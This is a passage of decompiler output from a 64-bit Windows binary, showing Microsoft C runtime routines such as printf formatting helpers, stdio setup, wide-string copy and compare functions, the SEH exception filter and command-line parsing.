  bool v4; // zf
  unsigned int v5; // eax

  *(_QWORD *)(a1 + 32) += 8LL;
  v2 = *(unsigned __int16 **)(*(_QWORD *)(a1 + 32) - 8LL);
  if ( v2 == nullptr || (v3 = *((_QWORD *)v2 + 1)) == 0 )
  {
    *(_DWORD *)(a1 + 80) = 6;
    *(_QWORD *)(a1 + 72) = "(null)";
    goto LABEL_7;
  }
  v4 = !__crt_stdio_output::is_wide_character_specifier<wchar_t>(
          *(_QWORD *)a1,
          *(_WORD *)(a1 + 66),
          *(_DWORD *)(a1 + 60));
  *(_QWORD *)(a1 + 72) = v3;
  v5 = *v2;
  if ( v4 )
  {
    *(_DWORD *)(a1 + 80) = v5;
LABEL_7:
    *(_BYTE *)(a1 + 84) = 0;
    return 1;
  }
  *(_DWORD *)(a1 + 80) = v5 >> 1;
  *(_BYTE *)(a1 + 84) = 1;
  return 1;
}


// ===== unknown_libname_8 @ 0x14000496c size=0x241 =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_8(__int64 a1)
{
  int v2; // eax
  __int64 v3; // rdi
  char is_big; // al
  unsigned __int64 v5; // r8
  __int64 v6; // rax
  __int64 v7; // rax
  bool v8; // zf
  unsigned __int64 v9; // r9
  __int64 v10; // rcx
  char *v11; // r10
  char *v12; // rdx
  struct __crt_locale_pointers *v13; // r8
  char *v14; // rdx
  char v15; // r8
  char v16; // al
  char *v17; // rdx
  char *v18; // rcx
  char v19; // al
  _BYTE *v20; // rax
  _BYTE *v21; // rdx
  __int64 v22; // rcx
  __int64 v23; // rcx
  double v25; // [rsp+60h] [rbp+8h] BYREF

  *(_DWORD *)(a1 + 48) |= 0x10u;
  v2 = *(_DWORD *)(a1 + 56);
  if ( v2 >= 0 )
  {
    if ( v2 == 0 && ((*(_WORD *)(a1 + 66) - 71) & 0xFFDF) == 0 )
      *(_DWORD *)(a1 + 56) = 1;
  }
  else
  {
    *(_DWORD *)(a1 + 56) = ((*(_WORD *)(a1 + 66) - 65) & 0xFFDF) != 0 ? 6 : 13;
  }
  v3 = a1 + 88;
  is_big = __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(a1 + 88, *(_DWORD *)(a1 + 56) + 349);
  v5 = 512;
  if ( is_big == 0 )
  {
    if ( *(_QWORD *)(v3 + 1032) != 0 )
      v6 = *(_QWORD *)(v3 + 1024) >> 1;
    else
      LODWORD(v6) = 512;
    *(_DWORD *)(a1 + 56) = v6 - 349;
  }
  v7 = *(_QWORD *)(v3 + 1032);
  if ( v7 == 0 )
    v7 = v3;
  *(_QWORD *)(a1 + 72) = v7;
  *(_QWORD *)(a1 + 32) += 8LL;
  v8 = *(_QWORD *)(v3 + 1032) == 0;
  v25 = 0.0;
  v25 = *(double *)(*(_QWORD *)(a1 + 32) - 8LL);
  if ( v8 )
    v9 = 512;
  else
    v9 = *(_QWORD *)(v3 + 1024) >> 1;
  v10 = *(_QWORD *)(v3 + 1032);
  if ( v10 != 0 )
    v11 = (char *)(v10 + (*(_QWORD *)(v3 + 1024) >> 1));
  else
    v11 = (char *)(v3 + 512);
  if ( v10 != 0 )
    v5 = *(_QWORD *)(v3 + 1024) >> 1;
  v12 = *(char **)(v3 + 1032);
  if ( v10 == 0 )
    v12 = (char *)v3;
  _acrt_fp_format(
    &v25,
    v12,
    v5,
    v11,
    v9,
    *(char *)(a1 + 66),
    *(_DWORD *)(a1 + 56),
    *(_QWORD *)a1,
    *(struct __crt_locale_pointers **)(a1 + 8));
  if ( (*(_DWORD *)(a1 + 48) & 0x20) != 0 && *(_DWORD *)(a1 + 56) == 0 )
    __crt_stdio_output::force_decimal_point(*(__crt_stdio_output **)(a1 + 72), *(char **)(a1 + 8), v13);
  if ( ((*(_WORD *)(a1 + 66) - 71) & 0xFFDF) == 0 && (*(_DWORD *)(a1 + 48) & 0x20) == 0 )
  {
    v14 = *(char **)(a1 + 72);
    v15 = ***(_BYTE ***)(**(_QWORD **)(a1 + 8) + 248LL);
    while ( *v14 != 0 && *v14 != v15 )
      ++v14;
    v16 = *v14;
    v17 = v14 + 1;
    if ( v16 != 0 )
    {
      while ( *v17 != 0 && ((*v17 - 69) & 0xDF) != 0 )
        ++v17;
      v18 = v17;
      do
        --v17;
      while ( *v17 == 48 );
      if ( *v17 == v15 )
        --v17;
      do
      {
        v19 = *v18;
        ++v17;
        ++v18;
        *v17 = v19;
      }
      while ( v19 != 0 );
    }
  }
  v20 = *(_BYTE **)(a1 + 72);
  if ( *v20 == 45 )
  {
    *(_DWORD *)(a1 + 48) |= 0x40u;
    *(_QWORD *)(a1 + 72) = ++v20;
  }
  v21 = *(_BYTE **)(a1 + 72);
  LOBYTE(v20) = *v21 - 73;
  if ( (unsigned __int8)v20 <= 0x25u )
  {
    v22 = 0x2100000021LL;
    if ( _bittest64(&v22, (unsigned __int64)v20) )
      *(_WORD *)(a1 + 66) = 115;
  }
  v23 = -1;
  do
    ++v23;
  while ( v21[v23] != 0 );
  *(_DWORD *)(a1 + 80) = v23;
  return 1;
}


// ===== unknown_libname_9 @ 0x140004bb0 size=0xa6 =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_9(__int64 a1)
{
  wchar_t v2; // si
  bool is_wide_character; // al
  wchar_t *v4; // rcx
  __crt_locale_pointers *v5; // r9
  __int64 v6; // rcx
  char result; // al
  char SrcCh; // [rsp+30h] [rbp+8h] BYREF
  char v9; // [rsp+31h] [rbp+9h]

  *(_BYTE *)(a1 + 84) = 1;
  *(_QWORD *)(a1 + 32) += 8LL;
  v2 = *(_WORD *)(*(_QWORD *)(a1 + 32) - 8LL);
  is_wide_character = __crt_stdio_output::is_wide_character_specifier<wchar_t>(
                        *(_QWORD *)a1,
                        *(_WORD *)(a1 + 66),
                        *(_DWORD *)(a1 + 60));
  v4 = *(wchar_t **)(a1 + 1120);
  if ( is_wide_character )
  {
    if ( v4 == nullptr )
      v4 = (wchar_t *)(a1 + 88);
    *v4 = v2;
  }
  else
  {
    v5 = *(__crt_locale_pointers **)(a1 + 8);
    SrcCh = v2;
    v9 = 0;
    if ( v4 == nullptr )
      v4 = (wchar_t *)(a1 + 88);
    if ( mbtowc_l(v4, &SrcCh, *((int *)v5->locinfo + 2), v5) < 0 )
      *(_BYTE *)(a1 + 64) = 1;
  }
  v6 = *(_QWORD *)(a1 + 1120);
  result = 1;
  *(_DWORD *)(a1 + 80) = 1;
  if ( v6 == 0 )
    v6 = a1 + 88;
  *(_QWORD *)(a1 + 72) = v6;
  return result;
}


// ===== sub_140004C58 @ 0x140004c58 size=0x19f =====
char __fastcall sub_140004C58(__int64 a1, unsigned int a2, char a3)
{
  int v4; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  __int64 v9; // rdx
  int v11; // ecx
  int v12; // ecx
  __int64 v13; // rcx
  int v14; // eax
  bool v15; // zf
  __int64 v16; // rax
  int v17; // eax
  __int64 v18; // rax
  int v19; // eax
  __int64 v20; // rax

  v4 = *(_DWORD *)(a1 + 60);
  if ( v4 > 5 )
  {
    v11 = v4 - 6;
    if ( v11 == 0 )
    {
      v9 = 8;
      goto LABEL_9;
    }
    v12 = v11 - 1;
    if ( v12 == 0 )
    {
      v9 = 8;
      goto LABEL_9;
    }
    v7 = v12 - 2;
    if ( v7 == 0 )
    {
      v9 = 8;
      goto LABEL_9;
    }
  }
  else
  {
    if ( v4 == 5 )
    {
      v9 = 8;
      goto LABEL_9;
    }
    if ( v4 == 0 )
    {
LABEL_14:
      v9 = 4;
      goto LABEL_9;
    }
    v6 = v4 - 1;
    if ( v6 == 0 )
    {
      v9 = 1;
      goto LABEL_9;
    }
    v7 = v6 - 1;
    if ( v7 == 0 )
    {
      v9 = 2;
      goto LABEL_9;
    }
  }
  v8 = v7 - 1;
  if ( v8 == 0 )
    goto LABEL_14;
  if ( v8 == 1 )
    v9 = 8;
  else
    v9 = 0;
LABEL_9:
  switch ( v9 )
  {
    case 1LL:
      v19 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8LL;
      v15 = (v19 & 0x10) == 0;
      v20 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned __int8 *)(v20 - 8);
      else
        v13 = *(char *)(v20 - 8);
      break;
    case 2LL:
      v17 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8LL;
      v15 = (v17 & 0x10) == 0;
      v18 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned __int16 *)(v18 - 8);
      else
        v13 = *(__int16 *)(v18 - 8);
      break;
    case 4LL:
      v14 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8LL;
      v15 = (v14 & 0x10) == 0;
      v16 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned int *)(v16 - 8);
      else
        v13 = *(int *)(v16 - 8);
      break;
    case 8LL:
      *(_QWORD *)(a1 + 32) += 8LL;
      v13 = *(_QWORD *)(*(_QWORD *)(a1 + 32) - 8LL);
      break;
    default:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
  }
  if ( (*(_DWORD *)(a1 + 48) & 0x10) != 0 && v13 < 0 )
  {
    v13 = -v13;
    *(_DWORD *)(a1 + 48) |= 0x40u;
  }
  if ( *(int *)(a1 + 56) >= 0 )
  {
    *(_DWORD *)(a1 + 48) &= ~8u;
    if ( *(int *)(a1 + 56) > 512 )
      *(_DWORD *)(a1 + 56) = 512;
  }
  else
  {
    *(_DWORD *)(a1 + 56) = 1;
  }
  if ( v13 == 0 )
    *(_DWORD *)(a1 + 48) &= ~0x20u;
  if ( v9 == 8 )
    unknown_libname_4(a1, v13, a2, a3);
  else
    unknown_libname_3(a1, v13, a2, a3);
  if ( (*(_DWORD *)(a1 + 48) & 0x80) != 0 && (*(_DWORD *)(a1 + 80) == 0 || **(_BYTE **)(a1 + 72) != 48) )
  {
    *(_BYTE *)--*(_QWORD *)(a1 + 72) = 48;
    ++*(_DWORD *)(a1 + 80);
  }
  return 1;
}


// ===== unknown_libname_10 @ 0x140004df8 size=0xdb =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_10(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v3; // rsi
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx

  v1 = 8;
  *(_QWORD *)(a1 + 32) += 8LL;
  v3 = *(_QWORD **)(*(_QWORD *)(a1 + 32) - 8LL);
  if ( get_printf_count_output() == 0 )
    goto LABEL_2;
  v5 = *(_DWORD *)(a1 + 60);
  if ( v5 <= 5 )
  {
    if ( v5 == 5 )
      goto LABEL_18;
    if ( v5 == 0 )
      goto LABEL_17;
    v6 = v5 - 1;
    if ( v6 == 0 )
    {
      v1 = 1;
      goto LABEL_18;
    }
    v7 = v6 - 1;
    if ( v7 == 0 )
    {
      v1 = 2;
      goto LABEL_18;
    }
LABEL_8:
    v8 = v7 - 1;
    if ( v8 != 0 )
    {
      if ( v8 != 1 )
        v1 = 0;
      goto LABEL_18;
    }
LABEL_17:
    v1 = 4;
    goto LABEL_18;
  }
  v9 = v5 - 6;
  if ( v9 != 0 )
  {
    v10 = v9 - 1;
    if ( v10 != 0 )
    {
      v7 = v10 - 2;
      if ( v7 != 0 )
        goto LABEL_8;
    }
  }
LABEL_18:
  v11 = v1 - 1;
  if ( v11 != 0 )
  {
    v12 = v11 - 1;
    if ( v12 != 0 )
    {
      v13 = v12 - 2;
      if ( v13 != 0 )
      {
        if ( v13 != 4 )
        {
LABEL_2:
          *errno() = 22;
          invalid_parameter_noinfo();
          return 0;
        }
        *v3 = *(int *)(a1 + 40);
      }
      else
      {
        *(_DWORD *)v3 = *(_DWORD *)(a1 + 40);
      }
    }
    else
    {
      *(_WORD *)v3 = *(_WORD *)(a1 + 40);
    }
  }
  else
  {
    *(_BYTE *)v3 = *(_BYTE *)(a1 + 40);
  }
  *(_BYTE *)(a1 + 64) = 1;
  return 1;
}


// ===== unknown_libname_11 @ 0x140004ed4 size=0xc6 =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_11(__int64 a1)
{
  int v2; // edi
  int v3; // r8d
  __int16 v4; // dx
  const wchar_t *v5; // rsi
  const wchar_t *v6; // rcx
  _BYTE *v7; // r8
  int i; // r9d

  *(_QWORD *)(a1 + 32) += 8LL;
  v2 = *(_DWORD *)(a1 + 56);
  v3 = *(_DWORD *)(a1 + 60);
  v4 = *(_WORD *)(a1 + 66);
  v5 = *(const wchar_t **)(*(_QWORD *)(a1 + 32) - 8LL);
  *(_QWORD *)(a1 + 72) = v5;
  if ( v2 == -1 )
    v2 = 0x7FFFFFFF;
  if ( __crt_stdio_output::is_wide_character_specifier<wchar_t>(*(_QWORD *)a1, v4, v3) )
  {
    v6 = L"(null)";
    *(_BYTE *)(a1 + 84) = 1;
    if ( v5 != nullptr )
      v6 = v5;
    *(_QWORD *)(a1 + 72) = v6;
    *(_DWORD *)(a1 + 80) = wcsnlen(v6, v2);
  }
  else
  {
    if ( v5 == nullptr )
      *(_QWORD *)(a1 + 72) = "(null)";
    v7 = *(_BYTE **)(a1 + 72);
    for ( i = 0; i < v2; ++i )
    {
      if ( *v7 == 0 )
        break;
      if ( *(__int16 *)(***(_QWORD ***)(a1 + 8) + 2LL * (unsigned __int8)*v7) < 0 )
        ++v7;
      ++v7;
    }
    *(_DWORD *)(a1 + 80) = i;
  }
  return 1;
}


// ===== unknown_libname_12 @ 0x140004f9c size=0xed =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_12(__int64 a1)
{
  const char *v2; // rsi
  int v3; // edi
  __crt_locale_pointers *v4; // r9
  int v5; // eax
  __int64 v6; // rcx
  wchar_t v7; // r8
  wchar_t DstCh; // [rsp+40h] [rbp+8h] BYREF

  if ( *(_BYTE *)(a1 + 84) != 0 || *(int *)(a1 + 80) <= 0 )
  {
    __crt_stdio_output::string_output_adapter<wchar_t>::write_string(
      a1 + 1128,
      *(_QWORD *)(a1 + 72),
      *(_DWORD *)(a1 + 80),
      a1 + 40,
      *(_QWORD *)(a1 + 16));
  }
  else
  {
    v2 = *(const char **)(a1 + 72);
    v3 = 0;
    while ( 1 )
    {
      v4 = *(__crt_locale_pointers **)(a1 + 8);
      DstCh = 0;
      v5 = mbtowc_l(&DstCh, v2, *((int *)v4->locinfo + 2), v4);
      if ( v5 <= 0 )
        break;
      v6 = *(_QWORD *)(a1 + 1128);
      v7 = DstCh;
      if ( *(_QWORD *)(v6 + 16) == *(_QWORD *)(v6 + 8) )
      {
        if ( *(_BYTE *)(v6 + 24) != 0 )
          ++*(_DWORD *)(a1 + 40);
        else
          *(_DWORD *)(a1 + 40) = -1;
      }
      else
      {
        ++*(_DWORD *)(a1 + 40);
        ++*(_QWORD *)(v6 + 16);
        ***(_WORD ***)(a1 + 1128) = v7;
        **(_QWORD **)(a1 + 1128) += 2LL;
      }
      v2 += v5;
      if ( ++v3 == *(_DWORD *)(a1 + 80) )
        return 1;
    }
    *(_DWORD *)(a1 + 40) = -1;
  }
  return 1;
}


// ===== ?write_string@?$string_output_adapter@_W@__crt_stdio_output@@QEBAXQEB_WHQEAH1@Z @ 0x14000508c size=0xbf =====
__int64 __fastcall __crt_stdio_output::string_output_adapter<wchar_t>::write_string(
        __int64 *a1,
        const __m128i *a2,
        int a3,
        _DWORD *a4,
        int *a5)
{
  __int64 v7; // rbp
  int v8; // r15d
  _QWORD *v9; // rcx
  __int64 result; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // r14
  __m128i *v13; // rcx

  v7 = a3;
  v8 = *a5;
  *a5 = 0;
  v9 = (_QWORD *)*a1;
  result = v9[1];
  if ( v9[2] == result )
  {
    if ( *((_BYTE *)v9 + 24) != 0 )
      *a4 += a3;
    else
      *a4 = -1;
  }
  else
  {
    v11 = result - v9[2];
    v12 = a3;
    v13 = (__m128i *)*v9;
    if ( v11 < a3 )
      v12 = v11;
    sub_1400036D0(v13, a2, 2 * v12);
    *(_QWORD *)*a1 += 2 * v12;
    *(_QWORD *)(*a1 + 16) += v12;
    result = *a1;
    if ( *(_BYTE *)(*a1 + 24) != 0 )
    {
      *a4 += v7;
    }
    else if ( v12 == v7 )
    {
      *a4 += v12;
    }
    else
    {
      *a4 = -1;
    }
  }
  if ( *a5 == 0 && v8 != 0 )
    *a5 = v8;
  return result;
}


// ===== unknown_libname_13 @ 0x14000514c size=0x6e =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_13(
        int a1,
        _WORD *a2,
        unsigned __int64 a3,
        __int64 a4,
        struct __crt_locale_pointers *a5,
        __int64 a6)
{
  __int64 result; // rax

  if ( a4 == 0 || a2 == nullptr || a3 == 0 )
  {
    *errno() = 22;
    goto LABEL_9;
  }
  result = sub_140003BA8(a1, a2, a3, a4, a5, a6);
  if ( (int)result < 0 )
    *a2 = 0;
  if ( (_DWORD)result == -2 )
  {
    *errno() = 34;
LABEL_9:
    invalid_parameter_noinfo();
    return 0xFFFFFFFFLL;
  }
  return result;
}


// ===== __acrt_initialize_stdio @ 0x1400051bc size=0x11f =====
__int64 _acrt_initialize_stdio()
{
  int v0; // eax
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v4; // r14
  _DWORD *v5; // rsi
  char *v6; // rbp

  v0 = dword_14001D080;
  v1 = 0;
  v2 = 3;
  if ( dword_14001D080 != 0 )
  {
    if ( dword_14001D080 < 3 )
      v0 = 3;
  }
  else
  {
    v0 = 512;
  }
  dword_14001D080 = v0;
  Block = calloc_base(v0, 8u);
  free_base(nullptr);
  if ( Block == nullptr )
  {
    dword_14001D080 = 3;
    Block = calloc_base(3u, 8u);
    free_base(nullptr);
    if ( Block == nullptr )
      return 0xFFFFFFFFLL;
  }
  v4 = 0;
  v5 = &unk_14001C058;
  v6 = (char *)&unk_14001C040;
  do
  {
    _acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(v6 + 48), 0xFA0u);
    *(_QWORD *)((char *)Block + v4) = v6;
    if ( *(_QWORD *)(qword_14001D350[v1 >> 6] + ((unsigned __int64)(v1 & 0x3F) << 6) + 40) >= 0xFFFFFFFFFFFFFFFEuLL
      || *(_QWORD *)(qword_14001D350[v1 >> 6] + ((unsigned __int64)(v1 & 0x3F) << 6) + 40) == 0 )
    {
      *v5 = -2;
    }
    ++v1;
    v6 += 88;
    v4 += 8;
    v5 += 22;
    --v2;
  }
  while ( v2 != 0 );
  return 0;
}


// ===== __acrt_uninitialize_stdio @ 0x1400052dc size=0x5b =====
void _acrt_uninitialize_stdio()
{
  __int64 i; // rbx

  flushall();
  fcloseall();
  for ( i = 0; i != 24; i += 8 )
  {
    _acrt_stdio_free_buffer_nolock(*(_QWORD *)((char *)Block + i));
    DeleteCriticalSection((LPCRITICAL_SECTION)(*(_QWORD *)((char *)Block + i) + 48LL));
  }
  free_base(Block);
  Block = nullptr;
}


// ===== sub_140005338 @ 0x140005338 size=0xb =====
void __fastcall sub_140005338(__int64 a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}


// ===== sub_140005344 @ 0x140005344 size=0xb =====
void __fastcall sub_140005344(__int64 a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}


// ===== _wcsicmp @ 0x140005350 size=0x85 =====
int __cdecl wcsicmp(const wchar_t *String1, const wchar_t *String2)
{
  const wchar_t *v2; // r9
  signed __int64 v4; // r10
  unsigned __int16 v5; // dx
  wchar_t v6; // cx

  v2 = String2;
  if ( dword_14001D2E4 != 0 )
    return wcsicmp_l(String1, String2, nullptr);
  if ( String1 != nullptr && String2 != nullptr )
  {
    v4 = (char *)String1 - (char *)String2;
    do
    {
      v5 = *(const wchar_t *)((char *)v2 + v4);
      if ( (unsigned __int16)(v5 - 65) <= 0x19u )
        v5 += 32;
      v6 = *v2;
      if ( (unsigned __int16)(*v2 - 65) <= 0x19u )
        v6 += 32;
      ++v2;
    }
    while ( v5 != 0 && v5 == v6 );
    return v5 - v6;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0x7FFFFFFF;
  }
}


// ===== _wcsicmp_l @ 0x1400053d8 size=0xed =====
int __cdecl wcsicmp_l(const wchar_t *String1, const wchar_t *String2, _locale_t Locale)
{
  int result; // eax
  signed __int64 v6; // rsi
  wint_t v7; // bx
  wchar_t v8; // cx
  wint_t v9; // ax
  __int64 v10; // [rsp+20h] [rbp-28h] BYREF
  __crt_locale_pointers Localea; // [rsp+28h] [rbp-20h] BYREF
  char v12; // [rsp+38h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v10, Locale);
  if ( String1 != nullptr && String2 != nullptr )
  {
    if ( *((_QWORD *)Localea.locinfo + 39) != 0 )
    {
      do
      {
        v7 = towlower_l(*String1++, &Localea);
        v9 = towlower_l(*String2++, &Localea);
        v8 = v9;
      }
      while ( v7 != 0 && v7 == v9 );
    }
    else
    {
      v6 = (char *)String1 - (char *)String2;
      do
      {
        v7 = *(const wchar_t *)((char *)String2 + v6);
        if ( (unsigned __int16)(v7 - 65) <= 0x19u )
          v7 += 32;
        v8 = *String2;
        if ( (unsigned __int16)(*String2 - 65) <= 0x19u )
          v8 += 32;
        ++String2;
      }
      while ( v7 != 0 && v7 == v8 );
    }
    result = v7 - v8;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    result = 0x7FFFFFFF;
  }
  if ( v12 != 0 )
    *(_DWORD *)(v10 + 936) &= ~2u;
  return result;
}


// ===== wcscpy_s @ 0x1400054c8 size=0x65 =====
errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)
{
  errno_t v3; // ebx
  int *v4; // rax
  wchar_t *v6; // r9
  signed __int64 v7; // r8
  wchar_t v8; // ax

  v3 = 0;
  if ( Destination == nullptr || SizeInWords == 0 )
    goto LABEL_5;
  if ( Source == nullptr )
  {
    *Destination = 0;
LABEL_5:
    v4 = errno();
    v3 = 22;
LABEL_6:
    *v4 = v3;
    invalid_parameter_noinfo();
    return v3;
  }
  v6 = Destination;
  v7 = (char *)Source - (char *)Destination;
  do
  {
    v8 = *(wchar_t *)((char *)v6 + v7);
    *v6++ = v8;
    if ( v8 == 0 )
      break;
    --SizeInWords;
  }
  while ( SizeInWords != 0 );
  if ( SizeInWords == 0 )
  {
    *Destination = 0;
    v4 = errno();
    v3 = 34;
    goto LABEL_6;
  }
  return v3;
}


// ===== wcscat_s @ 0x140005530 size=0x7f =====
errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)
{
  errno_t v3; // ebx
  wchar_t *v4; // r9
  int *v5; // rax
  signed __int64 v7; // r8
  wchar_t v8; // ax

  v3 = 0;
  v4 = Destination;
  if ( Destination == nullptr || SizeInWords == 0 )
    goto LABEL_5;
  if ( Source == nullptr )
  {
    *Destination = 0;
LABEL_5:
    v5 = errno();
    v3 = 22;
LABEL_6:
    *v5 = v3;
    invalid_parameter_noinfo();
    return v3;
  }
  do
  {
    if ( *Destination == 0 )
      break;
    ++Destination;
    --SizeInWords;
  }
  while ( SizeInWords != 0 );
  if ( SizeInWords == 0 )
  {
    *v4 = 0;
    goto LABEL_5;
  }
  v7 = (char *)Source - (char *)Destination;
  do
  {
    v8 = *(wchar_t *)((char *)Destination + v7);
    *Destination++ = v8;
    if ( v8 == 0 )
      break;
    --SizeInWords;
  }
  while ( SizeInWords != 0 );
  if ( SizeInWords == 0 )
  {
    *v4 = 0;
    v5 = errno();
    v3 = 34;
    goto LABEL_6;
  }
  return v3;
}


// ===== _seh_filter_exe @ 0x1400055b0 size=0x18d =====
int __cdecl seh_filter_exe(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)
{
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v9; // rdx
  void (__fastcall *v10)(_QWORD, _QWORD); // rdi
  __int64 v11; // rbp
  unsigned int v12; // esi
  __int64 v13; // rcx
  __int64 v14; // rdx
  int v15; // esi

  v4 = (_QWORD *)_acrt_getptd_noexit();
  v5 = v4;
  if ( v4 == nullptr )
    return 0;
  v7 = *v4;
  v8 = v7;
  v9 = v7 + 192;
  while ( *(_DWORD *)v8 != ExceptionNum )
  {
    v8 += 16;
    if ( v8 == v9 )
    {
      v8 = 0;
      break;
    }
  }
  if ( v8 == 0 )
    return 0;
  v10 = *(void (__fastcall **)(_QWORD, _QWORD))(v8 + 8);
  if ( v10 == nullptr )
    return 0;
  if ( v10 == (void (__fastcall *)(_QWORD, _QWORD))5 )
  {
    *(_QWORD *)(v8 + 8) = 0;
    return 1;
  }
  else
  {
    if ( v10 != (void (__fastcall *)(_QWORD, _QWORD))1 )
    {
      v11 = v5[1];
      v5[1] = ExceptionPtr;
      v12 = *(_DWORD *)(v8 + 4);
      if ( v12 == 8 )
      {
        v13 = v7 + 48;
        v14 = v13 + 144;
        while ( v13 != v14 )
        {
          *(_QWORD *)(v13 + 8) = 0;
          v13 += 16;
        }
        v15 = *((_DWORD *)v5 + 4);
        switch ( *(_DWORD *)v8 )
        {
          case 0xC000008D:
            *((_DWORD *)v5 + 4) = 130;
            break;
          case 0xC000008E:
            *((_DWORD *)v5 + 4) = 131;
            break;
          case 0xC000008F:
            *((_DWORD *)v5 + 4) = 134;
            break;
          case 0xC0000090:
            *((_DWORD *)v5 + 4) = 129;
            break;
          case 0xC0000091:
            *((_DWORD *)v5 + 4) = 132;
            break;
          case 0xC0000092:
            *((_DWORD *)v5 + 4) = 138;
            break;
          case 0xC0000093:
            *((_DWORD *)v5 + 4) = 133;
            break;
          case 0xC00002B4:
            *((_DWORD *)v5 + 4) = 142;
            break;
          case 0xC00002B5:
            *((_DWORD *)v5 + 4) = 141;
            break;
          default:
            break;
        }
        ((void (__fastcall *)(__int64, _QWORD, _QWORD))v10)(8, *((unsigned int *)v5 + 4), 0);
        *((_DWORD *)v5 + 4) = v15;
      }
      else
      {
        *(_QWORD *)(v8 + 8) = 0;
        v10(v12, v9);
      }
      v5[1] = v11;
    }
    return -1;
  }
}


// ===== sub_140005740 @ 0x140005740 size=0x7 =====
__int64 sub_140005740()
{
  return (unsigned int)dword_14001D090;
}


// ===== sub_140005748 @ 0x140005748 size=0x7 =====
void __fastcall sub_140005748(int a1)
{
  dword_14001D090 = a1;
}


// ===== __acrt_has_user_matherr @ 0x140005750 size=0x1d =====
bool _acrt_has_user_matherr()
{
  return __ROR8__(qword_14001D098 ^ _security_cookie, _security_cookie & 0x3F) != 0;
}


// ===== sub_140005770 @ 0x140005770 size=0x8 =====
void __fastcall sub_140005770(__int64 a1)
{
  qword_14001D098 = a1;
}


// ===== __acrt_invoke_user_matherr @ 0x140005778 size=0x45 =====
__int64 __fastcall _acrt_invoke_user_matherr(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64); // rbx

  v1 = (__int64 (__fastcall *)(__int64))__ROR8__(qword_14001D098 ^ _security_cookie, _security_cookie & 0x3F);
  if ( v1 != nullptr )
    return v1(a1);
  else
    return 0;
}


// ===== __setusermatherr @ 0x1400057c0 size=0x25 =====
void __cdecl _setusermatherr(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  qword_14001D098 = _security_cookie ^ __ROR8__(UserMathErrorFunction, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
}


// ===== ??$parse_command_line@_W@@YAXPEA_WPEAPEA_W0PEA_K2@Z @ 0x1400057e8 size=0x196 =====
__int64 __fastcall parse_command_line<wchar_t>(unsigned __int16 *a1, _QWORD *a2, _WORD *a3, _QWORD *a4, _QWORD *a5)
{
  bool v6; // r9
  __int64 result; // rax
  bool v8; // di
  int v9; // r11d
  unsigned int v10; // eax

  *a5 = 0;
  *a4 = 1;
  if ( a2 != nullptr )
    *a2++ = a3;
  v6 = false;
  do
  {
    if ( *a1 == 34 )
    {
      result = 34;
      v6 = !v6;
      ++a1;
    }
    else
    {
      ++*a5;
      if ( a3 != nullptr )
        *a3++ = *a1;
      result = *a1++;
      if ( (_WORD)result == 0 )
      {
        --a1;
        goto LABEL_15;
      }
    }
  }
  while ( v6 || (_WORD)result != 32 && (_WORD)result != 9 );
  if ( a3 != nullptr )
    *(a3 - 1) = 0;
LABEL_15:
  v8 = false;
  while ( *a1 != 0 )
  {
    while ( *a1 == 32 || *a1 == 9 )
      ++a1;
    if ( *a1 == 0 )
      break;
    if ( a2 != nullptr )
      *a2++ = a3;
    ++*a4;
    while ( 1 )
    {
      v9 = 1;
      v10 = 0;
      while ( *a1 == 92 )
      {
        ++a1;
        ++v10;
      }
      if ( *a1 == 34 )
      {
        if ( (v10 & 1) == 0 )
        {
          if ( v8 && a1[1] == 34 )
          {
            ++a1;
          }
          else
          {
            v9 = 0;
            v8 = !v8;
          }
        }
        v10 >>= 1;
      }
      while ( v10 != 0 )
      {
        --v10;
        if ( a3 != nullptr )
          *a3++ = 92;
        ++*a5;
      }
      result = *a1;
      if ( (_WORD)result == 0 || !v8 && ((_WORD)result == 32 || (_WORD)result == 9) )
        break;
      if ( v9 != 0 )
      {
        if ( a3 != nullptr )
          *a3++ = result;
        ++*a5;
      }
      ++a1;
    }
    if ( a3 != nullptr )
      *a3++ = 0;
    ++*a5;
  }
  if ( a2 != nullptr )
    *a2 = 0;
  ++*a4;
  return result;
}


// ===== __acrt_allocate_buffer_for_argv @ 0x140005980 size=0x61 =====
void *__fastcall _acrt_allocate_buffer_for_argv(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  void *v4; // rbx

